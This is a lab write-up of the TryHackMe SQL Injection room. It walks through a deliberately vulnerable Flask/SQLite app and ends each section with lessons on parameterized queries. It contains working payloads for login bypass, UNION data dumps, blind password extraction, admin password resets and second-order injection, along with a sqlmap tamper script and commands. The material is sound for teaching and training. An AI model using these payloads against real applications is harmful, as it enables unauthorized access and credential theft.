# SQL Injection Lab

A hands-on walk through an "employee management" web app riddled with deliberate SQL injection bugs — the same mistakes real developers make. It runs the full arc: login bypass, dumping data with `UNION`, enumerating an unknown database, extracting a password one character at a time when the app gives you nothing back, and two *second-order* injections where the payload is stored first and fires later.

> This is the **TryHackMe "SQL Injection" room** (Jr Penetration Tester path). The app is Flask + SQLite; the target is `http://MACHINE_IP:5000`. Toggle **Show Query** and **Guidance** in the top-right menu to see the exact SQL each challenge runs. Scripts referenced below are on the box's **Downloads** page (`/downloads/`).
>
> 🔗 Companion theory notes: PortSwigger's version of these techniques lives in [`Web-Security-Academy/SQL-Injection/`](../../../Web-Security-Academy/SQL-Injection/README.md) — especially [UNION attacks](../../../Web-Security-Academy/SQL-Injection/SQL-injection-UNION-attacks.md), [Blind SQLi](../../../Web-Security-Academy/SQL-Injection/Blind-SQL-injection.md), and [Second-order](../../../Web-Security-Academy/SQL-Injection/Second-order-SQL-injection.md).

---

**Table of contents**

- [In plain English](#in-plain-english)
- [Why this happens: string concatenation](#why-this-happens-string-concatenation)
- [The `-- -` comment trick](#the----comment-trick)
- [SQLi 1–4: login bypass in four contexts](#sqli-14-login-bypass-in-four-contexts)
- [SQLi 5: injection on an UPDATE statement](#sqli-5-injection-on-an-update-statement)
- [Challenge 1: broken authentication](#challenge-1-broken-authentication)
- [Challenge 2: UNION-based data dump](#challenge-2-union-based-data-dump)
- [Challenge 3: boolean-based blind](#challenge-3-boolean-based-blind)
- [Challenge 4: second-order via the notes page](#challenge-4-second-order-via-the-notes-page)
- [Challenge 5: second-order via change-password](#challenge-5-second-order-via-change-password)
- [Challenge 6: UNION via book search](#challenge-6-union-via-book-search)
- [Challenge 7: chained/nested UNION](#challenge-7-chainednested-union)
- [Key takeaways](#key-takeaways)

---

## In plain English

A database query is just a sentence the app builds and hands to the database. The bug in every challenge here is the same: the app **pastes your input straight into that sentence** instead of keeping it separate. So if you type the right punctuation, your input stops being *data* ("look up this username") and becomes *code* ("...and also return everything").

| Challenge | The idea in one line |
| --- | --- |
| **SQLi 1–4** | Same login bypass (`OR 1=1`) shown in four places the input can enter: a number field, a string field, the URL, and a POST body. |
| **SQLi 5** | The injection is on an `UPDATE`, so instead of *reading* extra data you can *overwrite* fields — including another user's password. |
| **Challenge 1** | Bare login bypass — get in without a password. |
| **Challenge 2** | Get in, then use `UNION` to make the app print the whole password column back to you. |
| **Challenge 3** | The app tells you nothing (just "in" or "not in"). Ask it thousands of yes/no questions to spell out the password — **blind** injection. |
| **Challenge 4** | Your username is safely stored... then a *different*, unsafe query reads it back later and fires. **Second-order.** |
| **Challenge 5** | Register as `admin'-- -`; a later `UPDATE` treats you *as* admin and resets the real admin's password. |
| **Challenge 6** | A book-search box built with `LIKE` — close the `LIKE` string and `UNION` out the data. |
| **Challenge 7** | Two vulnerable queries chained; feed the first one's output into the second to turn a blind bug into an easy `UNION`. |

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Jargon, quickly:</strong> <strong>SQL injection (SQLi)</strong> = tricking an app into running your SQL by smuggling it in through an input. <strong>Payload</strong> = the malicious snippet you inject. <strong>Sanitization</strong> = cleaning/escaping input so it can't break out of the data slot. <strong>Parameterized query</strong> = the correct fix — send the query shape and the data <em>separately</em> so data can never become code. <strong>UNION</strong> = SQL keyword that glues a second query's rows onto the first's results. <strong>Blind SQLi</strong> = injection where you can't see the data, only infer it from the app's behaviour (logged in vs not, fast vs slow). <strong>Second-order</strong> = payload is stored safely first, then triggered later by a different unsafe query.
</div>

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>How to use these notes:</strong> a lookup sheet, not something to memorise. Learn the one-line hook for each challenge; come back for the exact payload when you need it. The <em>why</em> matters more than the string — every payload here is just "close the quote, add my logic, comment out the rest."
</div>

---

## Why this happens: string concatenation

Apps need dynamic queries — "show the row matching *this* username." The lazy way to build one is to glue the user's input straight into the query string:

```php
$query = "SELECT * FROM users WHERE username='" . $_POST["user"] . "' AND password='" . $_POST["password"] . "'";
```

Nothing checks what's in `user`. So the moment you include a single quote (`'`), you close the string the developer opened and everything after it is read as **SQL, not data**. That single missing check — input sanitization — is the root cause of every bug in this room.

The three-part anatomy of essentially every payload here:

1. **Break out** of the data context — a `'` (or nothing, for numeric fields) closes the string literal.
2. **Inject logic** — `OR 1=1`, a `UNION SELECT`, a sub-query, etc.
3. **Neutralise the tail** — comment out the rest of the original query so it stays valid.

---

## The `-- -` comment trick

`--` starts a comment in SQL, so appending it makes the database ignore whatever the developer wrote after your injection (like the `AND password=...` check).

But **MySQL is fussy**: its `--` comment needs the second dash followed by at least one whitespace/control character. So the room standardises on `-- -` (dash-dash-space-dash):

- The trailing `<space><char>` satisfies MySQL's rule.
- It survives URL-encoding: `-- -` → `--%20-`, which still decodes back to a valid `-- ` comment.

Rule of thumb: **always inject `-- -`, not bare `--`.** (Ref: [blog.raw.pm SQLi MySQL comments](https://blog.raw.pm/en/sql-injection-mysql-comment/).)

---

## SQLi 1–4: login bypass in four contexts

All four run essentially the same lookup:

```sql
SELECT uid, name, profileID, salary, passportNr, email, nickName, password
FROM usertable WHERE profileID=10 AND password='ce5ca67...'
```

The app logs in as the **first row returned**, so any always-true condition that returns rows gets you in as user #1. What changes each time is *where* the input enters and how it's quoted.

### SQLi 1 — numeric field

`profileID` is used as a raw integer (`profileID=10`), so no quote is needed:

```text
1 or 1=1-- -
```

→ `... WHERE profileID=1 or 1=1-- - AND password=...`

### SQLi 2 — string field

Now the value is quoted (`profileID='10'`), so you must close the quote first:

```text
1' or '1'='1'-- -
```

### SQLi 3 — URL (GET) with client-side validation

A JavaScript function blocks special characters:

```js
if (/^[a-zA-Z0-9]*$/.test(profileID) == false || /^[a-zA-Z0-9]*$/.test(password) == false) {
    alert("The input fields cannot contain special characters");
    return false;
}
```

**Client-side validation is not security** — it only shapes the UX, and you control the client. Skip the form entirely and hit the endpoint directly:

```text
http://MACHINE_IP:5000/sesqli3/login?profileID=-1' or 1=1-- -&password=a
```

The browser URL-encodes it for you (`%27` = `'`, `%20` = space):

```text
http://MACHINE_IP:5000/sesqli3/login?profileID=-1%27%20or%201=1--%20-&password=a
```

### SQLi 4 — POST body

Same idea, but the form uses POST. Either disable the JS validation in the browser, or intercept the request with a proxy (Burp Suite) and edit the `profileID` field to `-1' or 1=1-- -` before it reaches the server.

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>The lesson across 1–4:</strong> the vulnerability is identical; only the <em>entry point and quoting</em> differ. Any filter that runs in the browser (regex validation, disabled buttons, dropdowns) can be bypassed with a proxy — validate and parameterize on the <strong>server</strong>.
</div>

---

## SQLi 5: injection on an UPDATE statement

An `UPDATE` injection is nastier than a `SELECT` one: instead of *reading* extra data you can *write* it. The edit-profile page runs something like:

```sql
UPDATE <table> SET nickName='name', email='email' WHERE <condition>
```

**Step 1 — confirm the bug and guess columns.** Column names often mirror the form's `name=` attributes. Inject into the `nickName`/`email` fields:

```text
asd',nickName='test',email='hacked
```

If injecting into `email` updates *both* fields, the column names are right and the form is injectable. (Wrong column names → nothing updates.)

**Step 2 — ask the database what it is.** Push the DB's version string into a field you can read back:

```sql
# MySQL and MSSQL
',nickName=@@version,email='
# Oracle
',nickName=(SELECT banner FROM v$version),email='
# SQLite
',nickName=sqlite_version(),email='
```

Here it returns **SQLite 3.27.2**.

**Step 3 — enumerate tables** (SQLite keeps schema in `sqlite_master`; `group_concat()` dumps many rows into one string):

```sql
',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master
  WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%'),email='
```

→ only table is `usertable`.

**Step 4 — enumerate columns** (the `sql` column holds each table's `CREATE` statement):

```sql
',nickName=(SELECT sql FROM sqlite_master
  WHERE type!='meta' AND sql NOT NULL AND name='usertable'),email='
```

→ columns: `UID, name, profileID, salary, passportNr, email, nickName, password`.

**Step 5 — dump the data** (`||` is SQLite's string-concat operator):

```sql
',nickName=(SELECT group_concat(profileID || "," || name || "," || password || ":") FROM usertable),email='
```

**Step 6 — the passwords are hashed.** Identify with `hash-identifier` → **SHA-256**. To overwrite a target's password, hash your chosen plaintext (e.g. via [CyberChef](https://gchq.github.io/CyberChef/)) and set it:

```sql
', password='008c70392e3abfbd0fa47bbc2ed96aa99bd49e159727fcba0f2e6abeb3a9d601' WHERE name='Admin'-- -
```

> **Task login:** `profileID: 10` / `password: toor`. The flag lives in *another* table, so repeat the table/column enumeration above to find it.

---

## Challenge 1: broken authentication

The warm-up. Vulnerable login form, no filtering, just bypass it:

```text
' OR 1=1-- -
```

as the username (blank password). You're logged in as the first user; the flag is on the page.

---

## Challenge 2: UNION-based data dump

Same bypass works (`' OR 1=1-- -`), but now the goal is to dump **all** passwords **without** blind injection. First find a place the query's output is shown back — the app prints the logged-in **username top-right**, and also stores `user_id`/`username` in the **Flask session cookie**.

Decode the cookie (F12 → Storage → copy `session`) at [kirsle.net flask-session decoder](https://www.kirsle.net/wizards/flask-session.cgi) or with the box's `/download/decode_cookie.py`:

```json
{ "challenge2_user_id": 1, "challenge2_username": "admin" }
```

That confirms the query returns two columns (`id, username`):

```sql
SELECT id, username FROM users WHERE username='...' AND password='...'
```

**UNION needs two things to match:** (1) same number of columns as the original query, (2) compatible column types. Enumerate the count until the app lets you in / stops erroring:

```sql
1' UNION SELECT NULL-- -
1' UNION SELECT NULL, NULL-- -
```

Two columns works. Confirm control by watching your injected values echo into the username field / cookie:

```sql
' UNION SELECT 1,2-- -
```

→ username shows as `2`. Now dump every password at once with `group_concat()`:

```sql
' UNION SELECT 1,group_concat(password) FROM users-- -
```

The concatenated passwords (flag among them) appear in the username display and inside the decoded cookie.

---

## Challenge 3: boolean-based blind

Same login bug, but **no output channel** — the cookie and username display no longer leak data. All you get is a binary signal: successful login (**302 redirect**) vs "Invalid username or password". That's enough to extract the password one character at a time.

**Building blocks (SQLite):**

- `SUBSTR(string, start, length)` — grab one character at a chosen position:
  ```text
  SUBSTR("THM{Blind}", 1,1) = T
  SUBSTR("THM{Blind}", 2,1) = H
  ```
- `(SELECT password FROM users LIMIT 0,1)` — the admin's password. `LIMIT <offset>,<count>` picks which row.
- Combine → first char of admin's password:
  ```sql
  SUBSTR((SELECT password FROM users LIMIT 0,1),1,1)
  ```

**The case-folding gotcha:** this app lowercases the username, so `= 'T'` breaks (`T` ≠ `t`). Sidestep it by comparing against a **hex-encoded** byte and casting back to text — `T` is `0x54`:

```sql
SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' AS Text)
```

**Fit it into the login query** — close the username, `AND` the condition, comment the rest:

```sql
admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' AS Text)-- -
```

A **302** means that guess was correct. Loop every position × every possible byte to spell out the password.

**Find the length first** so the script knows when to stop:

```sql
admin' AND length((SELECT password FROM users WHERE username='admin'))==37-- -
```

The box ships an example script at `/view/challenge3/challenge3-exploit.py` (set `password_len`). It's deliberately noisy/inefficient — a good exercise is writing a leaner one (e.g. binary search per character).

**Or automate with sqlmap:**

```bash
sqlmap -u http://MACHINE_IP:5000/challenge3/login \
  --data="username=admin&password=admin" \
  --level=5 --risk=3 --dbms=sqlite --technique=b --dump
```

(`--technique=b` = boolean-based blind.)

---

## Challenge 4: second-order via the notes page

The interesting one. The notes feature **inserts** safely — it uses parameterized queries, so writing a malicious note does nothing:

```sql
INSERT INTO notes (username, title, note) VALUES (?, ?, ?)   -- safe
INSERT INTO users (username, password) VALUES (?, ?)         -- signup, also safe
```

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Key insight:</strong> parameterized queries stop injection <em>at insert time</em>, but they happily <strong>store</strong> malicious text. The bug is that a <em>different</em> query later reads that stored value back <strong>unsafely</strong> — so <em>every</em> query touching the data must be parameterized, not just the ones taking direct user input.
</div>

The unsafe read is the query that lists your notes — it concatenates the username:

```sql
SELECT title, note FROM notes WHERE username = '" + username + "'
```

So the injection point is your **registered username**. Register with:

```text
' union select 1,2'
```

Then visit the notes page (as that user) to trigger it. The app runs:

```sql
SELECT title, note FROM notes WHERE username = '' union select 1,2''
```

→ `1` shows as the note title, `2` as the note body — two-column control confirmed. Now register usernames that dump the schema/data:

```text
' union select 1,group_concat(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%''
```
```text
'  union select 1,group_concat(password) from users'
```

The password dump (flag included) renders as your notes.

### Automating with sqlmap (tamper script)

A plain sqlmap run fails because the inject point (`/signup`) and the trigger (`/notes`) are different requests. A **tamper script** makes sqlmap register → log in → visit notes for every payload:

```python
#!/usr/bin/python
import requests
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

address = "http://MACHINE_IP:5000/challenge4"
password = "asd"

def dependencies():
    pass

def create_account(payload):
    with requests.Session() as s:
        s.post(f"{address}/signup", data={"username": payload, "password": password})

def login(payload):
    with requests.Session() as s:
        s.post(f"{address}/login", data={"username": payload, "password": password})
        sessid = s.cookies.get("session", None)
    return "session={}".format(sessid)

def tamper(payload, **kwargs):
    headers = kwargs.get("headers", {})
    create_account(payload)
    headers["Cookie"] = login(payload)   # attach fresh session so /notes fires the injection
    return payload
```

Put an empty `__init__.py` beside it, set `address`/`password`, then:

```bash
sqlmap --tamper so-tamper.py \
  --url http://MACHINE_IP:5000/challenge4/signup --data "username=admin&password=asd" \
  --second-url http://MACHINE_IP:5000/challenge4/notes \
  -p username --dbms sqlite --technique=U --no-cast
```

| Flag | Meaning |
| --- | --- |
| `--tamper` | the register→login→visit script |
| `--url` / `--data` | injection endpoint + POST body (password must match the script) |
| `--second-url` | page to visit to check for results (where the payload fires) |
| `-p username` | inject the `username` parameter |
| `--technique=U` | UNION-based |
| `--no-cast` | disable payload casting (needed to dump `users` cleanly here) |

At the prompts: **no** to following 302 redirects, **yes** to continue if it flags a WAF/IPS, **no** to merging cookies, **no** to reducing requests. Then dump:

```bash
sqlmap --tamper tamper/so-tamper.py \
  --url http://MACHINE_IP:5000/challenge4/signup --data "username=admin&password=asd" \
  --second-url http://MACHINE_IP:5000/challenge4/notes \
  -p username --dbms=sqlite --technique=U --no-cast -T users --dump
```

sqlmap is noisy (creates many junk users; output trims to 256 rows) but writes the full result to a dump file — the flag is at the top.

---

## Challenge 5: second-order via change-password

Another second-order bug, this time on an `UPDATE`. The developer parameterized the *password* (direct user input) but concatenated the *username*, reasoning it comes from the session/DB and is therefore "trusted":

```sql
UPDATE users SET password = ? WHERE username = '" + username + "'
```

The flaw: **you chose that username at registration.** Register a user named:

```text
admin'-- -
```

Then change your password. The `WHERE` clause becomes:

```sql
UPDATE users SET password = ? WHERE username = 'admin' -- -'
```

The `-- -` comments out the tail, so the condition is just `username='admin'` — you've **reset the real admin's password** to yours. Log in as `admin` to get the flag.

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Why this bites:</strong> "the value comes from the database, not the user" is a trap — it originally came from the user (signup) and was stored verbatim. <strong>Trust boundaries don't reset just because data took a lap through the DB.</strong> Parameterize every query, including ones fed by "internal" values.
</div>

---

## Challenge 6: UNION via book search

A book search runs a nested query with `LIKE`:

```sql
SELECT * FROM books WHERE id = (SELECT id FROM books WHERE title LIKE '" + title + "%')
```

Close the `LIKE` string (`'`), close the sub-query's paren (`)`), add logic, comment the trailing `%')`:

```text
') or 1=1-- -
```

→ dumps all books. From there, apply the [UNION technique](../../../Web-Security-Academy/SQL-Injection/SQL-injection-UNION-attacks.md) (match the column count, then `group_concat`) to extract the hidden flag.

---

## Challenge 7: chained/nested UNION

The app runs **two** vulnerable queries — the first fetches an id, the second uses that id unsanitized:

```python
bid = db.sql_query(f"SELECT id FROM books WHERE title like '{title}%'", one=True)
if bid:
    query = f"SELECT * FROM books WHERE id = '{bid['id']}'"
```

The first query alone is only *blind*-exploitable, but because its **output feeds the second query**, you can control what the second query sees and turn the whole thing into a clean `UNION` — easier and quieter than blind.

**Step 1 — return zero rows, then UNION a value of your choice** into what query 2 receives. Give a title that doesn't exist so `LIKE` matches nothing, then `UNION SELECT` your string:

```text
' union select 'STRING
```

→ query 2's `id` becomes `STRING%`.

**Step 2 — comment out the trailing wildcard** the app appends (`%`), so a real id matches:

```text
' union select '1'-- -
```

→ returns book id 1.

**Step 3 — nest a second UNION** to pull arbitrary columns. The catch: the `'` you open around the injected value would prematurely close the string before the second `UNION`. **Escape it by doubling the quote** (`''`):

```text
' union select '-1''union select 1,2,3,4-- -
```

Now the second query is effectively:

```sql
SELECT * FROM books WHERE id = '' union select 1,2,3,4-- -
```

Full four-column control → swap `1,2,3,4` for the schema/data queries to extract the flag.

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>The trick to remember:</strong> when a blind bug's output is later reused by a second unsafe query, you can <em>launder</em> your data through the first query to make the second one directly exploitable — trading a slow character-by-character attack for a single UNION. And when your own quotes get in the way, <code>''</code> (doubled) is a literal quote inside a SQL string.
</div>

---

## Key takeaways

- **One root cause, many faces.** Every bug here is string-concatenated user input. The fix is always the same: **parameterized queries** (send query shape and data separately) — filtering, escaping, and client-side checks are not substitutes.
- **Always inject `-- -`, not `--`.** MySQL needs whitespace after the comment; `-- -` also survives URL-encoding.
- **Client-side validation is cosmetic.** Regex checks, disabled buttons, and dropdowns are trivially bypassed with a proxy or by hitting the endpoint directly. Enforce on the server.
- **Pick your technique by what leaks back:** data echoed on the page/cookie → **UNION**; only a binary in/out signal → **boolean blind**; nothing but timing → time-based (see the PortSwigger notes).
- **`UNION` rules:** match the original query's **column count** and **types**; enumerate the count with incremental `NULL`s; use `group_concat()` to dump many rows in one shot.
- **SQLite enumeration muscle memory:** `sqlite_version()` to fingerprint, `sqlite_master` for tables/columns (`tbl_name`, `sql`), `||` to concatenate, `SUBSTR`/`LIMIT`/`CAST(X'..' AS Text)` for blind extraction.
- **Second-order is the sneaky class:** a safe `INSERT` still *stores* your payload; a later unsafe `SELECT`/`UPDATE` executes it. Parameterize **every** query — including ones fed by "trusted" internal values (Challenge 5's username came from signup).
- **sqlmap fits real apps with tamper scripts + `--second-url`** when the injection point and the trigger are different requests.

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Cross-reference:</strong> for the same techniques against MySQL/Postgres/Oracle/MSSQL (not just SQLite), the per-database syntax is in <a href="../../../Web-Security-Academy/SQL-Injection/SQL-injection-cheat-sheet.md">the SQL injection cheat sheet</a>, and prevention is covered in <a href="../../../Web-Security-Academy/SQL-Injection/Preventing-SQL-injection.md">Preventing SQL injection</a>.
</div>
